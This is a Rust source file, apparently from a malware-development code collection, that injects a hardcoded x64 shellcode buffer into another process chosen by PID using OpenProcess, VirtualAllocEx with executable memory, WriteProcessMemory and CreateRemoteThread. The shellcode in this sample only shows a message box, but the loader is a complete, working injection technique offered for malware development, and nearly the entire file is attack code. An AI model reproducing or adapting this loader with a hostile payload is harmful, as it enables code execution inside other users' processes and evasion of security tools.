/*
    CreateRemoteThread Shellcode Injection : Exec Shellcode in Remote Process
    For more codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    
    
*/
use std::ptr::null_mut;

use winapi::{shared::minwindef::LPVOID, 
    um::{
        errhandlingapi::GetLastError,
        handleapi::CloseHandle, 
        memoryapi::{VirtualAllocEx, WriteProcessMemory}, 
        processthreadsapi::{CreateRemoteThread, OpenProcess}, 
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}
    }
};

macro_rules! okey{
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[+] {}", format!($msg, $($arg),*));   
    }
}

macro_rules! error{
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[-] {}", format!($msg, $($arg), *));
        println!("Exiting ...");
        std::process::exit(0);
    }
}

fn main(){
    let buf: [u8; 328] = [ 
        0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
        0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
        0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
        0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
        0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
        0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
        0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
        0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
        0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
        0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
        0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
        0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
        0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
        0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
        0x48,0x8d,0x8d,0x30,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
        0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
        0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x24,0x01,
        0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
        0x48,0x65,0x79,0x20,0x6d,0x61,0x6e,0x2e,0x20,0x49,0x74,0x73,
        0x20,0x6d,0x65,0x20,0x53,0x6d,0x75,0x6b,0x78,0x00,0x6b,0x6e,
        0x6f,0x63,0x6b,0x2d,0x6b,0x6e,0x6f,0x63,0x6b,0x00,0x75,0x73,
        0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00
    ];

    unsafe{
        let pid = std::env::args().nth(1).expect("Please provide the process ID as argument")
            .parse::<u32>().expect("Invalid process ID");

        let process_handle = OpenProcess(0x000F0000 | 0x00100000 | 0xFFFF, 0, pid);

        if process_handle.is_null(){
            error!("OpenProcess Error : {:?}",GetLastError());
        }

        okey!("OpenProcess: {:?}",process_handle);

        let remote_buffer = VirtualAllocEx(
            process_handle,
            null_mut(),
            buf.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_buffer.is_null(){
            error!("VirtualAlloc Error {:?}",GetLastError());
        }

        okey!("VirtualAlloc {:?}",remote_buffer);

        let write = WriteProcessMemory(
            process_handle,
            remote_buffer,
            buf.as_ptr() as LPVOID,
            buf.len(),
            null_mut(),
        );

        if write == 0{
            error!("Error writing process to memory. STATUS: {}", write);
        }

        let remote_thread = CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            std::mem::transmute(remote_buffer),
            null_mut(),
            0,
            null_mut(),
        );

        if remote_thread.is_null(){
            error!("Unable to create Remote thread. Status: {:?}", remote_thread);
        }

        CloseHandle(process_handle);
    }
}